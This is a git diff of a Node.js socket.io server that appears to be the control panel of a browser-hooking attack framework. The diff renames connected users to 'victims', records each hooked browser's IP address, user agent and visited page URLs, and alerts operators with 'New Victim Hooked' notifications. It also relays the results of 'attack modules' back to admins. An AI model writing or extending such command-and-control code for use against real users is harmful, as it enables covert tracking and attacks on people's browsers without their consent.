@@ -1,21 +1,19 @@
 const adminSocket = require('../admin/sockets')
 
-module.exports.sockets = {}
 //id for sockets which we increment. This should eventually be stored in a database
 let visibleIdIndex = 1
-let visibleIdsBySessionId = {}
+
+const victimsBySessionId = module.exports.victimsBySessionId = {}
 
 module.exports.configure = function(io){
   io.on('connection', function(socket){
-    
-    console.log('a user connected')
 
-    socket.join('users')
-    
-    const newUser = buildNewUser(socket)
-    adminSocket.emit('newUser', newUser)
-    module.exports.sockets[newUser.id] = newUser
+    console.log('a victim connected')
 
+    socket.join('victims')
+
+    //process newly connected victim
+    connect(socket)
 
     //when an attack module has finished running. Relay it back to the admins
     socket.on('result', function(data){
@@ -30,45 +28,63 @@ module.exports.configure = function(io){
     //when user disconnects, let admin know
     socket.on('disconnect', function(){
       disconnect(socket)
-      console.log("user disconnected")
+      console.log(`victim ${victimsBySessionId[socket.handshake.session.id].visibleId} disconnected`)
     })
 
   })
 }
 
-function buildNewUser(socket){
 
-  const clientIp = socket.handshake.address
-  const clientAgent = socket.handshake.headers['user-agent']
-  socket._id = visibleIdsBySessionId[socket.handshake.session.id]
-  if(!socket._id) {
-    socket._id = visibleIdIndex++
-    visibleIdsBySessionId[socket.handshake.session.id] = socket._id
-    adminSocket.emit('notify', {
-      title: 'New Victim Hooked',
-      options: {
-        body: socket.handshake.headers['referer']
+function connect(socket){
+  let sessionId = socket.handshake.session.id
+  let victim = victimsBySessionId[sessionId]
+  if(!victim){
+    processNewVictim(socket)
+  }else{
+    victim.activePagesBySocketId[socket.id] = {
+      socketId: socket.id,
+      url: socket.handshake.headers['referer'],
+      connectedAt: new Date(socket.handshake.time)
+    }
+    adminSocket.emit('updateVictim', victim)
+  }
+}
+
+function processNewVictim(socket){
+  //address is in the form ::ffff:000.000.000.000
+  let ip = socket.handshake.address.slice(socket.handshake.address.lastIndexOf(':') + 1)
+  //when connecting from localhost address is '::1'
+  ip = ip === '1' ? '127.0.0.1' : ip
+
+  let newVictim = victimsBySessionId[socket.handshake.session.id] = {
+    visibleId: visibleIdIndex++,
+    ip,
+    agent: socket.handshake.headers['user-agent'],
+    connectedAt: new Date(socket.handshake.time),
+    activePagesBySocketId: {
+      [socket.id]: {
+        socketId: socket.id,
+        url: socket.handshake.headers['referer'],
+        connectedAt: new Date(socket.handshake.time)
       }
-    })
+    }
   }
-    
-  //store the id number of the socket on it in a new property
-  return{
-    id: socket._id,
-    socketId: socket.id,
-    //address is in the form ::ffff:000.000.000.000
-    ip: clientIp.slice(clientIp.lastIndexOf(':') + 1),
-    agent: clientAgent.slice(clientAgent.indexOf('(') + 1,clientAgent.indexOf(')')),
-    connectedAt: new Date(socket.handshake.time)
-  }
+
+  adminSocket.emit('newVictim', newVictim)
+
+  adminSocket.emit('notify', {
+    title: `New Victim Hooked - ${newVictim.visibleId}`,
+    options: {
+      body: socket.handshake.headers['referer']
+    }
+  })
 }
 
 function disconnect(socket){
-  adminSocket.emit('userLeft', {
-    id: socket._id,
-    socketId: socket.id
-  })
+  let sessionId = socket.handshake.session.id
+  let victim = victimsBySessionId[sessionId]
 
-  //remove socket from active sockets array
-  delete module.exports.sockets[socket._id]
+  //adminSocket.emit('victimDisconnect', socket.id)
+  delete victim.activePagesBySocketId[socket.id]
+  adminSocket.emit('updateVictim', victim)
 }
